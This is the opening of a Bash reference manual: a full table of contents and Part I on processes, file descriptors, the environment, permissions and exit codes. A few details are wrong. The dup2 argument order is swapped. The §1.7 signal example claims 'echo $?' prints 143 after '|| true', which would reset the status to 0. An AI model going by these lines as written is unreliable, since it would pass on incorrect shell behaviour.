# BCS Advanced Bash Reference

**A comprehensive, lookup-oriented reference for modern Bash on Linux.**

Designed by Okusi Associates for the Indonesian Open Technology Foundation (YaTTI).
Target audience: working engineers, library authors, reviewers, and AI assistants.

Strict-mode assumptions throughout. Bottom-up structure: from the Unix model Bash sits on, through the language itself, through engineering discipline, to internals — closing on Bash 5.3 and beyond.

## Companion documents

[Bash Coding Standard (BCS)](../data/BASH-CODING-STANDARD.md) — ~100 actionable rules for BCS-compliant Bash 5.2+ scripts.

[BCS-bash](BCS-bash/index.md) — the `bash(1)` man page rewritten under strict-mode assumptions (`set -euo pipefail`, `[[ ]]` only, no POSIX compat).

[Examples directory](../examples/) — exemplar BCS-compliant scripts.

[Templates](../examples/templates/) — `complete`, `basic`, `minimal`, `library` script scaffolds.

---

## About this reference

This is a **structural reference guide** for advanced Bash users. It assumes Bash 5.2 or newer on Ubuntu 24.04 (or comparable Linux), strict-mode operation (`set -euo pipefail` with `shopt -s inherit_errexit`), and that the reader can already write at least basic shell.

It is organised bottom-up: the Unix model first (because Bash is a thin language over Unix primitives), then Bash as a program, then the language proper (lexical structure, parameters, expansions, redirection, control flow), then the engineering layer (functions, libraries, process management, signals, errors, I/O, CLI, concurrency, IPC), then the interactive layer (readline), then performance, security, tooling, idioms, portability, and internals — closing on Bash 5.3 and beyond.

### Who this is for

- Working engineers who write Bash regularly and need a single authoritative lookup.
- Library and tool authors who must understand semantics precisely, not approximately.
- Reviewers and standards authors who need cross-references between code, the BCS coding standard, and the Bash 5.2 man page.

### What this is *not*

- Not a coding standard. See [`../data/BASH-CODING-STANDARD.md`](../data/BASH-CODING-STANDARD.md) for ~100 actionable rules.
- Not a re-statement of the bash(1) man page. See [`BCS-bash/`](BCS-bash/) for a strict-mode-rewritten man-page reference. This document is *organised pedagogically* and routinely cross-references both BCS and BCS-bash.

### Conventions

- **Section numbering.** `Part N → Chapter N.M → Section N.M.K`. Cross-references use §N.M.K. Anchors follow the heading text.
- **Cross-references.** *BCS hook* → coding-standard section. *BCS-bash* → strict-mode man-page file. *Greg* → Greg Wooledge's wiki at `mywiki.wooledge.org`. *Manual* → GNU Bash Reference Manual.
- **Strict mode is assumed.** Every example, every recommendation. POSIX `sh` deviations are called out explicitly when relevant; otherwise not mentioned.
- **British English** throughout, matching BCS docs.
- **Briefing notes** under each heading describe the intended content of that section. Sub-bullets list the specific topics to cover. This document is the *structural skeleton* of the reference; full content lives in (or will live in) the chapter bodies.

### How to use this document

For lookup, use the Table of Contents. Each chapter is self-contained — you should never need to read prior chapters to understand a later one, though forward references are flagged. For systematic study, read top-to-bottom; the ordering is bottom-up by design.

---

## Table of Contents

### Part I — The Unix Model from Bash
1.1 Processes — fork, exec, wait
1.2 The file descriptor model
1.3 Files, directories, and special files
1.4 Streams and the standard descriptors
1.5 The shell environment
1.6 Users, groups, permissions
1.7 Exit status and process termination
1.8 Signals — overview
1.9 The controlling terminal and TTY layer

### Part II — Bash as a Program
2.1 Genealogy and the shell family
2.2 Bash version landscape
2.3 Build configuration and feature detection
2.4 Invocation modes
2.5 Startup file chains
2.6 `BASH_ENV` and `ENV`
2.7 Command-line options to bash itself
2.8 Exit and shell session lifecycle

### Part III — Lexical Structure and Shell Grammar
3.1 Tokenisation
3.2 Reserved words
3.3 Comments
3.4 Quoting overview
3.5 Single quotes
3.6 Double quotes
3.7 ANSI-C quoting `$'...'`
3.8 Locale-translation `$"..."`
3.9 Backslash escapes
3.10 Shell grammar
3.11 Operator precedence

### Part IV — Parameters, Variables, and Arrays
4.1 Parameter taxonomy
4.2 Positional parameters
4.3 Special parameters
4.4 Shell variables
4.5 The `declare` builtin and attributes
4.6 `local` and dynamic scope
4.7 `readonly` and immutability
4.8 `export` and the environment
4.9 Indexed arrays
4.10 Associative arrays
4.11 Namerefs (`-n`)
4.12 Integer arithmetic semantics
4.13 Variable assignment semantics
4.14 Unsetting

### Part V — Expansions
5.1 Order of expansions
5.2 Brace expansion
5.3 Tilde expansion
5.4 Parameter and variable expansion
5.5 Arithmetic expansion
5.6 Command substitution
5.7 Process substitution
5.8 Word splitting and IFS
5.9 Pathname expansion (globbing)
5.10 Quote removal
5.11 Glob options
5.12 Extended globs (extglob)
5.13 Locale and pattern matching

### Part VI — Redirection and Pipelines
6.1 The fd table from Bash's perspective
6.2 Input redirection
6.3 Output redirection
6.4 Stderr redirection and merging
6.5 Reading and writing (`<>`)
6.6 Duplicating fds
6.7 Moving and closing fds
6.8 Here-documents
6.9 Here-strings (`<<<`)
6.10 Process substitution as redirection
6.11 Order of evaluation
6.12 `exec` for fd manipulation
6.13 Pipelines
6.14 Stderr pipelines (`|&`)
6.15 `pipefail` semantics
6.16 `lastpipe` semantics

### Part VII — Control Flow and Compound Commands
7.1 Compound command overview
7.2 `if`/`elif`/`else`/`fi`
7.3 `case`/`esac`
7.4 `for x in list`
7.5 C-style `for ((;;))`
7.6 `while`/`until`
7.7 `select`
7.8 Subshell grouping `( … )`
7.9 Brace grouping `{ … ; }`
7.10 `&&` and `||` short-circuits
7.11 `break` and `continue`
7.12 `return`
7.13 `exit`
7.14 `:`, `true`, `false`

### Part VIII — Conditional Expressions and Arithmetic
8.1 `[[ ]]` overview
8.2 File test operators
8.3 File comparison operators
8.4 String operators
8.5 Pattern matching with `==`
8.6 Regex matching with `=~`
8.7 Logical operators and grouping
8.8 Quoting rules inside `[[ ]]`
8.9 Arithmetic context `(( ))`
8.10 Arithmetic operators and precedence
8.11 Integer types, overflow, base prefixes
8.12 Floating-point — workarounds
8.13 `let` builtin
8.14 The deprecated `[ ]` and `test`

### Part IX — Functions
9.1 Definition syntax
9.2 Argument passing
9.3 `local` and scope
9.4 Return value via `return N`
9.5 Communicating results
9.6 Recursion and `FUNCNEST`
9.7 Function tracing
9.8 Listing and inspecting functions
9.9 Exporting functions
9.10 Naming conventions
9.11 Self-locating with `BASH_SOURCE`
9.12 Calling-convention discipline

### Part X — Sourcing, Libraries, and Modules
10.1 `source` semantics
10.2 The `BASH_SOURCE` array
10.3 Self-locating library pattern
10.4 Idempotent sourcing guards
10.5 Namespace prefixes
10.6 Public vs private conventions
10.7 Version negotiation
10.8 Lazy and conditional loading
10.9 Cross-shell sourcing pitfalls
10.10 API design
10.11 Distribution and installation

### Part XI — Process Management
11.1 The Bash process tree at runtime
11.2 PIDs: `$$`, `$BASHPID`, `$PPID`
11.3 Subshell origins
11.4 `BASH_SUBSHELL` depth tracking
11.5 Foreground vs background
11.6 Process groups and sessions
11.7 The job table
11.8 Job specifications
11.9 Job-control builtins
11.10 `kill` and signal delivery
11.11 `nohup` and `setsid`
11.12 Detaching from the terminal
11.13 Environment inheritance

### Part XII — Signals and Traps
12.1 Signal taxonomy
12.2 Signal numbers and names
12.3 Uncatchable signals
12.4 Signal disposition
12.5 The `trap` builtin
12.6 Pseudo-signals: EXIT, ERR, DEBUG, RETURN
12.7 `trap -p` and trap inspection
12.8 Trap inheritance
12.9 Trap reset across `exec`
12.10 Synchronous vs asynchronous delivery
12.11 Signal-safe code
12.12 Idempotent cleanup patterns
12.13 Tempfile and tempdir lifecycle
12.14 Lockfile pattern
12.15 Atomic file write
12.16 Reload-on-SIGHUP

### Part XIII — Error Handling and Exit Status
13.1 Exit status fundamentals
13.2 `set -e` (errexit) — full semantics
13.3 The errexit exemption matrix
13.4 `set -u` (nounset)
13.5 `set -o pipefail`
13.6 `inherit_errexit`
13.7 `||:` and `|| true` idioms
13.8 The `ERR` trap
13.9 `errtrace` and trap inheritance
13.10 Exit code conventions
13.11 Propagating exit codes
13.12 Rich error output

### Part XIV — Input, Output, and Messaging
14.1 Standard streams discipline
14.2 The `read` builtin
14.3 `mapfile` / `readarray`
14.4 The `printf` builtin
14.5 `printf` vs `echo`
14.6 Format specifiers
14.7 Logging discipline
14.8 Log levels
14.9 Coloured output and TERM detection
14.10 Progress indicators
14.11 Reading binary data
14.12 File locking for concurrent writes

### Part XV — Command-Line Processing
15.1 CLI conventions
15.2 `getopts` builtin
15.3 GNU `getopt(1)` external
15.4 Hand-rolled `while case shift`
15.5 Long options
15.6 Bundled short options
15.7 `--` end-of-options
15.8 Subcommand dispatch
15.9 Help text conventions
15.10 Synopsis grammar
15.11 Auto-generating usage

### Part XVI — Concurrency and Parallelism
16.1 Sequential vs background execution
16.2 `wait` and `wait -n`
16.3 `wait $pid` for specific child
16.4 Capturing per-child exit status
16.5 Bounded-concurrency fan-out
16.6 The job table under concurrency
16.7 `xargs -P`
16.8 GNU parallel
16.9 Race conditions in shell
16.10 Locking primitives
16.11 Signal handling under concurrency
16.12 Queue patterns

### Part XVII — Coprocesses and IPC
17.1 The `coproc` builtin
17.2 Bidirectional fd pairs
17.3 Multiple coprocesses
17.4 Named pipes (FIFOs)
17.5 Anonymous pipes
17.6 `/dev/tcp` and `/dev/udp`
17.7 `/dev/shm` shared memory
17.8 External IPC tools
17.9 Choosing the right primitive

### Part XVIII — Readline, History, and Completion
18.1 Readline overview
18.2 Editing modes
18.3 Key bindings
18.4 Bindable functions
18.5 History
18.6 The `history` builtin
18.7 History expansion
18.8 Programmable completion
18.9 Compspec actions
18.10 `_init_completion`
18.11 Dynamic completion functions
18.12 `COMPREPLY` and `COMP_*` variables
18.13 Prompts
18.14 Prompt escapes
18.15 Coloured and multi-line prompts
18.16 Terminal capability detection

### Part XIX — Performance
19.1 The Bash cost model
19.2 Profiling tools
19.3 `time` builtin vs `time` external
19.4 `BASH_XTRACEFD`
19.5 `PS4` instrumentation
19.6 `EPOCHREALTIME` for sub-second timing
19.7 Common optimisations
19.8 Parameter expansion vs external commands
19.9 Pipes vs redirection
19.10 Builtins vs externals
19.11 Bash 5.3 no-fork command substitution
19.12 Memory considerations
19.13 When Bash is the wrong tool

### Part XX — Security
20.1 Threat model
20.2 PATH hardening
20.3 IFS reset
20.4 `eval` avoidance
20.5 Command injection vectors
20.6 Input validation
20.7 Quoting under `set -u`
20.8 SUID restrictions
20.9 Secrets handling
20.10 `noclobber`
20.11 Privilege drop
20.12 Sanitising filenames
20.13 Symlink races
20.14 Restricted shell mode

### Part XXI — Static Analysis, Formatting, and Testing
21.1 ShellCheck warnings
21.2 ShellCheck directives
21.3 Source-path management
21.4 `shfmt`
21.5 `bcscheck`
21.6 Pre-commit hooks
21.7 CI integration
21.8 bats-core
21.9 Bats setup and teardown
21.10 Bats `run` and assertions
21.11 Mocking via PATH injection
21.12 shunit2
21.13 Coverage with kcov

### Part XXII — Idioms, Patterns, and Anti-Patterns
22.1 The strict-mode preamble
22.2 Self-locating script directory
22.3 Argument-parsing skeleton
22.4 Default-value patterns
22.5 Lazy initialisation
22.6 Memoisation
22.7 Iterating an associative array deterministically
22.8 Building structured output
22.9 Reading config files safely
22.10 Atomic file write
22.11 Exclusive lock
22.12 Bounded retry with exponential backoff
22.13 Tempdir lifecycle
22.14 Mock-friendly subprocess wrapper
22.15 Stack-trace error reporter
22.16 Self-test mode (dual-purpose script)
22.17 Anti-patterns catalogue

### Part XXIII — POSIX Conformance and Portability
23.1 Bash vs POSIX sh
23.2 The bashisms list
23.3 Bash vs dash
23.4 Bash vs ksh
23.5 Bash vs zsh
23.6 Bash 3.2 on macOS
23.7 BSD `sh`
23.8 `--posix` mode
23.9 `shopt` compatibility levels
23.10 When to write portable sh
23.11 Forward-compatibility hygiene
23.12 Targeting multiple Bash versions

### Part XXIV — Bash Internals
24.1 The execution pipeline
24.2 The bison grammar
24.3 Variable storage
24.4 Function storage
24.5 The job table
24.6 The trap table
24.7 The execution environment
24.8 Subshell forking
24.9 Builtin loadables
24.10 Reading the bash source

### Part XXV — Bash 5.3 and the Future
25.1 No-fork command substitution `${ cmd; }`
25.2 Other Bash 5.3 additions
25.3 Release cadence
25.4 Roadmap signals
25.5 Forward-compatibility considerations

### Appendices
Appendix A — Builtin Reference (alphabetical)
Appendix B — Special Parameters Reference
Appendix C — Shell Variables Reference
Appendix D — `set` Options Reference
Appendix E — `shopt` Options Reference
Appendix F — ANSI-C Escape Sequences
Appendix G — Glob and Extglob Patterns
Appendix H — Conditional Expression Operators
Appendix I — Parameter Expansion Cheat Sheet
Appendix J — Redirection Operators
Appendix K — Signal Numbers (Linux)
Appendix L — Exit Code Conventions
Appendix M — Bash Version History
Appendix N — Glossary
Appendix O — Cross-Reference: Sections to BCS Sections
Appendix P — Cross-Reference: Sections to BCS-bash Files
Appendix Q — Further Reading

---

<!-- BODY-START -->

# Part I — The Unix Model from Bash

*Bash is a thin shell over Unix. Most "advanced Bash" mysteries dissolve once the underlying Unix model is clear. This Part documents the Unix abstractions Bash exposes, framed as Bash sees them. It is not a general Unix textbook — it is the minimum mental model required for the rest of this reference to make sense.*

---

---

## 1.1 Processes — fork, exec, wait

The kernel-level process model on which every Bash construct ultimately rests. Bash decomposes "what a command is" into builtins (executed in-process), functions (executed in the current shell or a subshell depending on context), and external commands (executed via `fork(2)` followed by `execve(2)`).

### Syscall lifecycle

| Syscall | Effect | What carries over |
|---------|--------|--------------------|
| `fork(2)` | Duplicates the calling process. Child gets a fresh PID; parent receives the child's PID, child receives 0. | File descriptors (with their offsets), signal dispositions, environment, working directory, umask, controlling terminal. |
| `execve(2)` | Replaces the process image with a new programme. PID and PPID are preserved. | Open fds without `O_CLOEXEC`, environment (as supplied), PID. **Reset:** signal handlers (custom handlers revert to default), pending alarms. |
| `wait(2)` / `waitpid(2)` | Reaps a child and unblocks the parent. Returns the child's PID and status. | Status word encodes normal exit vs signalled termination (see §1.7). |

Bash's `fork → exec → wait` cycle is what runs every external command. Builtins skip `fork` (they execute in the current shell unless inside a pipeline subshell); shell functions also skip `fork` unless backgrounded or piped.

### `$$` versus `$BASHPID`

`$$` is the PID of the **script process**, fixed at startup and inherited unchanged by every subshell. `$BASHPID` is the PID of the **current shell**, refreshed in subshells. Use `$BASHPID` for any check that must distinguish a subshell from its parent.

```bash
# scenario: prove $$ is frozen, $BASHPID tracks subshell identity
echo "main: $$=$$ BASHPID=$BASHPID"
( echo "subshell: $$=$$ BASHPID=$BASHPID" )   # ⇒ $$ identical, BASHPID differs
```

### Concrete fork+exec

The shell forks for every external command. The child then `execve`s the target binary, inheriting the parent's fds and environment.

```bash
# scenario: fork+exec a child and reap it explicitly
date &                  # fork; child execs /usr/bin/date
declare -i child=$!     # PID returned by Bash's fork
wait "$child"           # waitpid(child) — reaps the zombie
echo "exit=$?"          # ⇒ exit=0
```

### Zombies and orphans

A **zombie** (state `Z` in `ps`) is a terminated child whose status has not yet been reaped. Bash's `wait` builtin issues `waitpid(2)` and clears it. An **orphan** is a child whose parent died first; it is re-parented to PID 1 (or to the nearest sub-reaper marked by `prctl(PR_SET_CHILD_SUBREAPER)`), which inherits the duty to reap.

```bash
# scenario: deliberately produce a transient zombie
sleep 0.1 &
declare -i pid=$!
sleep 0.2
ps -o pid,stat,comm -p "$pid" 2>/dev/null || true   # → may show "Z" before wait
wait "$pid" || true                                 # reap; status now collected
echo "reaped"                                       # ⇒ reaped
```

### Bash `wait` versus `waitpid(2)`

Bash's `wait` is a thin wrapper. `wait` (no arg) blocks until **all** background children are reaped; `wait PID` blocks for one; `wait -n` blocks until any single child finishes; `wait -f PID` waits for the process to terminate even if status was already reported (Bash 5.1+). See also §11.3 (wait patterns) and BCS1103.

### Process groups and sessions

Each pipeline runs in its own process group, allowing `Ctrl-C` to signal the whole group at once. Sessions group process groups under one controlling terminal. The deeper treatment — `setpgid(2)`, `setsid(2)`, foreground/background scheduling — is in §11.6.

**See also**: §1.2 (file descriptor inheritance across fork/exec), §1.7 (encoding of `wait` status), §11.6 (process groups), §17.1 (`coproc` lifecycle), BCS0101 (strict mode), BCS0408 (dependency management).

## 1.2 The file descriptor model

A file descriptor is a small non-negative integer that indexes the kernel's per-process open-file table. Every redirection in Bash is ultimately a manipulation of this table via `dup2(2)`, `open(2)`, and `close(2)`.

### The three-level mapping

```
process A                   kernel                       on-disk
+---------+              +---------------------+      +---------+
| fd 0  --|------+       | open file desc OFD1 |      |         |
| fd 1  --|---+  |       |  offset, flags ----------> |  inode  |
| fd 2  --|-+ |  |       +---------------------+      |         |
| fd 3  --|+| | +------> | OFD2  offset, flags ---->  +---------+
+---------+|| |          +---------------------+
            ||  +-------> | OFD3  offset, flags ---->  /dev/tty
            |+----------> | OFD2  (shared)
            +-----------> | OFD1  (shared via dup)
```

A process holds an array of fd entries. Each entry points to a kernel **open file description** (OFD) that owns the file offset and access flags. `dup2(newfd, oldfd)` aliases two fds onto the same OFD; closing one does not close the other. `fork(2)` duplicates the fd array but the children share OFDs with the parent — the offset is a single shared cursor. `execve(2)` keeps every fd that does not have `O_CLOEXEC` set.

### Conventional descriptors

`0` (stdin), `1` (stdout), `2` (stderr) are convention only — the kernel has no opinion. Bash inherits whatever the parent provided and re-points them via redirection. `>` is `dup2(open(file, O_WRONLY|O_CREAT|O_TRUNC), 1)` plus a close; `2>&1` is `dup2(1, 2)`.

### Inspecting fds at runtime

```bash
# scenario: list every fd held by the current shell
ls -l /proc/$$/fd                                # symlinks → real targets
exec 3>"/tmp/log.$$"                             # open new fd
ls -l /proc/$$/fd/3                              # ⇒ 3 -> /tmp/log.NNN
exec 3>&-                                        # close it (BCS0905)
```

`/proc/PID/fdinfo/N` exposes the OFD's current offset and flags — useful for debugging hung pipelines. `lsof -p $$` produces the same information in human-readable form and works without `/proc`.

### Redirection as `dup2` in disguise

```bash
# scenario: save stdout, redirect, restore
exec 4>&1                       # fd 4 ← duplicate of stdout
exec 1>/tmp/captured            # stdout ← /tmp/captured
echo 'goes to file'             # ⇒ written to /tmp/captured
exec 1>&4 4>&-                  # restore stdout, drop the saved copy
echo 'goes to terminal'
```

This pattern is the substrate for every `>(…)`/`<(…)` process substitution in Bash. Process substitutions appear as `/dev/fd/N` paths because the kernel exposes the open fd table as a virtual directory.

### Limits and `O_CLOEXEC`

`ulimit -n` (`RLIMIT_NOFILE`) caps how many fds a single Bash process may hold. Bash sets `O_CLOEXEC` on every fd it opens for its own use (including pipeline ends), so child commands do not see the shell's bookkeeping fds — but **explicit** `exec N>file` opens are inherited unless you close them.

### Anti-patterns

```bash
# wrong — leaks fd 3 across exec
exec 3>"/tmp/log"
some-long-running-program        # inherits fd 3 unintentionally

# right — close before handing control over
exec 3>"/tmp/log"
do_logging_with_fd3
exec 3>&-
some-long-running-program
```

**See also**: §1.4 (streams and the standard descriptors), §6 (redirection and pipelines, full Part), §13.6 (process substitution), §17 (coprocesses), BCS0905 (input redirection), BCS0903 (process substitution).

## 1.3 Files, directories, and special files

The Linux VFS exposes seven file types through one uniform API. Bash exploits this freely; knowing which type to reach for is half the skill of writing concise shell. The conditional primaries `[[ -f ]]`, `[[ -d ]]`, `[[ -L ]]`, `[[ -p ]]`, `[[ -S ]]`, `[[ -c ]]`, `[[ -b ]]` map one-to-one to the seven types and are the canonical Bash interface; quoting these tests is mandatory under strict mode (BCS0303).

The seven canonical types and their `ls -l` glyphs:

| Glyph | Type             | Bash test    | Typical creator         |
|-------|------------------|--------------|-------------------------|
| `-`   | regular          | `[[ -f f ]]` | `>`, `cp`, editors      |
| `d`   | directory        | `[[ -d f ]]` | `mkdir`                 |
| `l`   | symbolic link    | `[[ -L f ]]` | `ln -s`                 |
| `p`   | FIFO / named pipe| `[[ -p f ]]` | `mkfifo`                |
| `s`   | Unix socket      | `[[ -S f ]]` | `socket(2)`, daemons    |
| `c`   | character device | `[[ -c f ]]` | `mknod c`               |
| `b`   | block device     | `[[ -b f ]]` | `mknod b`               |

Synthetic and special filesystems worth knowing:

- `/proc` — process introspection (`/proc/$$/fd`, `/proc/self/status`) and kernel parameters (`/proc/sys/...`).
- `/sys` — device and subsystem control (`/sys/class/net/`, `/sys/block/`).
- `/dev/null` (sink), `/dev/zero` (NUL stream), `/dev/full` (always-`ENOSPC` for write-error tests).
- `/dev/random`, `/dev/urandom` — entropy sources; on modern kernels (≥ 5.6) the two are functionally equivalent post-seed.
- `/dev/tcp/host/port` and `/dev/udp/host/port` — Bash-synthesised network endpoints, not real device nodes (see §17.6).
- `/dev/stdin`, `/dev/stdout`, `/dev/stderr`, `/dev/fd/N` — descriptor-as-path (see §1.4, §6.4).
- `tmpfs` filesystems: `/tmp`, `/run`, `/dev/shm` — RAM-backed; survives nothing across reboot.

```bash
# scenario: classify a path without forking stat(1)
classify_path() {
  local -- p="$1"
  [[ -L $p ]] && { printf 'symlink -> %s\n' "$(realpath -- "$p")"; return; }
  [[ -d $p ]] && { printf 'directory\n'; return; }
  [[ -f $p ]] && { printf 'regular (%d bytes)\n' "$(stat -c%s -- "$p")"; return; }
  [[ -p $p ]] && { printf 'fifo\n'; return; }
  [[ -S $p ]] && { printf 'socket\n'; return; }
  [[ -c $p ]] && { printf 'char-device\n'; return; }
  [[ -b $p ]] && { printf 'block-device\n'; return; }
  printf 'missing or inaccessible\n'
}
classify_path /dev/null   # ⇒ char-device
classify_path /tmp        # ⇒ directory
```

Order matters: test `-L` before `-f`/`-d` because the latter follow symlinks by default.

**See also**: §1.4 (streams), §1.6 (permission bits live on inodes), §6 (redirections that conjure FIFOs and `/dev/fd/N`), §17.6 (`/dev/tcp`).

## 1.4 Streams and the standard descriptors

Every program inherits stdin (fd 0), stdout (fd 1), and stderr (fd 2) from its parent. The discipline of "stdout is data, stderr is diagnostics" is not enforced by the kernel — it is a convention Bash scripts must uphold to remain composable in pipelines (BCS0702). A script that mixes diagnostic chatter into stdout is a script that cannot be piped without grief.

Key facts:

- Inheritance: descriptors survive `fork`/`exec` unless marked close-on-exec (`O_CLOEXEC`). Children see the same open file descriptions until they redirect.
- Buffering (set by libc, not the kernel): line-buffered when fd 1 is a terminal, fully-buffered (≈ 4-8 KiB) when fd 1 is a pipe or file, unbuffered for fd 2 by C convention.
- `stdbuf(1)` and `unbuffer(1)` (`expect`) override a child's libc buffering; Bash's own `printf` is line-buffered and rarely needs them.
- `isatty(3)` is the C interface; in Bash use `[[ -t N ]]`.
- Prefer `printf` over `echo` for any non-trivial output (see §14.5) — `echo`'s flag handling diverges across shells.

```bash
# scenario: emit colour only on a terminal, plain text in pipes
if [[ -t 1 ]]; then
  printf '\033[32m%s\033[0m\n' OK
else
  printf '%s\n' OK
fi
# ⇒ OK    (green when stdout is a TTY; plain when piped)
```

Buffering becomes visible the moment a pipeline appears. The classic trap:

```bash
# wrong — `grep` buffers because its stdout is now a pipe
tail -f log | grep ERROR | tee errors.log
# right — force grep to line-buffer so tee sees lines as they arrive
tail -f log | grep --line-buffered ERROR | tee errors.log
# alternative — wrap the buffering child via stdbuf
tail -f log | stdbuf -oL grep ERROR | tee errors.log
```

The descriptor-vs-filename duality is exposed via `/dev/fd/N` and `/proc/self/fd/N`:

```bash
exec 3< /etc/hostname            # fd 3 opened on a real file
ls -l /proc/self/fd/3            # ⇒ symlink pointing to /etc/hostname
read -r -u3 hostname; exec 3<&-  # consume and close
```

**See also**: §1.2 (fd table), §1.3 (`/dev/null` and friends), §6.1–§6.3 (redirection operators), §14.5 (`printf` vs `echo`), §20 (avoid leaking secrets to stdout/stderr).

## 1.5 The shell environment

Every process carries an **environment** — an array of `KEY=VALUE` strings inherited at `fork(2)` and replaced wholesale at `execve(2)`. The shell distinguishes plain shell variables (visible only inside the current shell) from environment variables (copied into every child's environ block).

### `export` versus a bare shell variable

A bare assignment populates the shell's symbol table but is **not** copied into the environment of forked children. `export` (or `declare -x`) flips the export bit so the variable is included in `environ(7)` at the next `execve`.

```bash
# scenario: prove the difference
SHELL_ONLY='only here'
export ENV_VAR='everywhere'

bash -c 'echo "SHELL_ONLY=${SHELL_ONLY:-unset}; ENV_VAR=${ENV_VAR:-unset}"'
# ⇒ SHELL_ONLY=unset; ENV_VAR=everywhere
```

A child process can never see a non-exported variable. There is no syscall to "read the parent's bare variables" — the membrane is one-way and only at `exec` boundaries.

### Inheritance and propagation

```
  parent shell                        child process
  ┌──────────────┐    fork(2)         ┌──────────────┐
  │ env: A,B,C   │ ─────────────────▶ │ env: A,B,C   │   (copy)
  │ shell: X,Y   │                    │ (no shell vs)│
  └──────────────┘                    └──────────────┘
                                              │ execve("prog", argv, environ)
                                              ▼
                                       ┌──────────────┐
                                       │ prog runs    │
                                       │ env: A,B,C   │   (preserved)
                                       └──────────────┘
```

After the child exits, the parent's environment is untouched: there is no back-channel for a child to mutate parent state. To pick up changes you must re-source (`source ~/.bashrc`) or re-exec the parent.

### Demonstrating environment propagation

```bash
# scenario: per-command override without polluting the shell
PATH="/usr/local/bin:$PATH" git status         # PATH set only for git
echo "${PATH@Q}"                               # parent PATH unchanged

# scenario: env var visible to a Python child
export PYTHONDONTWRITEBYTECODE=1
python3 -c 'import os; print(os.environ["PYTHONDONTWRITEBYTECODE"])'   # ⇒ 1
```

### Inherited process attributes

Beyond `environ`, `fork(2)` also copies:

- **Working directory** (`$PWD`, `$OLDPWD`).
- **`umask`** — affects `open()` mode bits (BCS1006).
- **Resource limits** (`ulimit`, see `getrlimit(2)`).
- **Locale**: `LANG`, `LC_*`, `LANGUAGE` (see §5.13).
- **Time zone** via `$TZ`.
- **`PATH`** — search semantics with security implications (BCS1002, §20.2).

`PATH` deserves special caution: a child that inherits a writable directory in `$PATH` can be hijacked. BCS1002 mandates an explicit, hard-coded `PATH` at script start.

### Anti-pattern

```bash
# wrong — assignment without export, expecting children to see it
DEBUG=1
./run-tests.sh        # DEBUG is unset inside run-tests.sh

# right — either export, or one-shot prefix
DEBUG=1 ./run-tests.sh
```

**See also**: §1.1 (fork/exec lifecycle), §1.3 (files), §2.5 (startup files), §5.13 (locale), §20.2 (PATH security), BCS1002 (PATH), BCS1003 (IFS), BCS1007 (environment scrubbing before exec).

## 1.6 Users, groups, permissions

The discretionary access control (DAC) model that every Bash script must respect. Linux distinguishes three IDs per process — real, effective, and saved — and the `chmod`/`chown` machinery operates on inodes via mode bits. Scripts that touch privileges must understand the trio; those that don't may forge ahead with `id` and `umask` alone.

The three IDs (each in user and group flavour):

| ID         | Meaning                                  | Bash inspection                |
|------------|------------------------------------------|--------------------------------|
| Real (ruid)| Who started the process                  | `id -ru`                       |
| Effective (euid) | Used for permission checks         | `id -u`, `$EUID`               |
| Saved (suid)     | Stash for `seteuid` swap-back      | not exposed via Bash; needs C  |

A non-SUID program normally has all three equal. SUID binaries (such as `sudo`, `passwd`) start with `euid=0` and `ruid=$invoker`, then juggle them via `seteuid()`. Bash refuses SUID on scripts (BCS1001 — SUID/SGID Prohibition); use `sudo` invocation, not `chmod u+s`.

Mode bits and their octal values:

| Symbol | Octal | Effect                              |
|--------|-------|-------------------------------------|
| `r`    | 4     | read                                |
| `w`    | 2     | write                               |
| `x`    | 1     | execute / traverse (on directory)   |
| `s` on owner   | 4000 | SUID — run as file owner     |
| `s` on group   | 2000 | SGID — run as file group / inherit group on dir |
| `t`    | 1000  | sticky — only owner may unlink (e.g. `/tmp`) |

Plus the optional layers most scripts can ignore: ACLs (`getfacl`, `setfacl`) and capabilities (`getcap`, `setcap`).

```bash
# scenario: show effective vs real identity, then grant a binary CAP_NET_BIND_SERVICE
printf 'ruid=%s euid=%s\n' "$(id -ru)" "$EUID"
# ⇒ ruid=1000 euid=1000
sudo setcap 'cap_net_bind_service=+ep' ./mywebd
getcap ./mywebd
# ⇒ ./mywebd cap_net_bind_service=ep
chmod 0640 secret.conf       # owner rw, group r, other none
chmod g+s shared/            # SGID dir: new files inherit shared's group
```

`umask` masks the bits that `creat(2)` would otherwise grant. A `umask 022` strips group/other write; `umask 077` makes new files private. Set it explicitly at the head of any script that creates sensitive files (BCS1006).

**See also**: §1.1 (process IDs), §1.5 (environment carries identity hints like `$USER`), §6.6 (umask interaction with redirection-created files), §10 (security — SUID prohibition, PATH hardening), §20.8 (why SUID scripts are forbidden).

## 1.7 Exit status and process termination

Every process exits with an 8-bit status code. Bash exposes it as `$?`, propagates it through pipelines, and uses it to drive `set -e`, `||`, `&&`, and `if`. The encoding distinguishes ordinary exits from termination by signal.

### Encoding

- **Normal exit:** `exit N` returns `N & 0xFF` to the parent. `exit 256` reports as 0; `exit 257` as 1.
- **Signal termination:** Bash reports the status as `128 + signum`. `kill -TERM` (signal 15) yields 143; `kill -KILL` (9) yields 137.
- `0` is success; non-zero is failure. This convention is universal — POSIX and the Linux kernel both observe it.

### BCS exit-code table

The Bash Coding Standard prescribes a fixed vocabulary so that callers can branch on `$?` without parsing messages (BCS0602):

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | General error |
| 2 | Usage / argument error |
| 3 | File or directory not found |
| 5 | I/O error |
| 13 | Permission denied |
| 18 | Missing dependency |
| 22 | Invalid argument |
| 24 | Timeout |

Reserved ranges (do not use): 64-78 (`sysexits.h`), 126 (cannot execute), 127 (not found), 128+n (signalled).

### Reading `$?`

`$?` is overwritten by every command and is "sticky" only until the next one. Capture it immediately into a typed integer if you need the value later.

```bash
# scenario: $? is replaced by every command, even by [[ ]]
( exit 42 )
declare -i rc=$?              # ⇒ rc=42
[[ -d /nonexistent ]]         # this overwrites $?
echo "rc=$rc, \$?=$?"          # ⇒ rc=42, $?=1
```

### Termination by signal — the `128 + signum` rule

When a child is killed by a signal, Bash synthesises the status from the kernel-reported signal number. Use `kill -l` to map back.

```bash
# scenario: prove 128+signum encoding
( kill -TERM "$BASHPID" ) || true
echo "$?"                    # ⇒ 143  (128 + 15)

( kill -INT "$BASHPID" ) || true
echo "$?"                    # ⇒ 130  (128 + 2)

kill -l 143                  # ⇒ TERM
```

### Pipelines and `set -o pipefail`

By default, a pipeline's exit status is that of its **last** command. `set -o pipefail` (mandatory under strict mode, BCS0101) returns the rightmost non-zero status, exposing failures in upstream stages.

```bash
# scenario: pipefail surfaces the upstream failure
set -o pipefail
false | true
echo "$?"      # ⇒ 1   (without pipefail, would be 0)
```

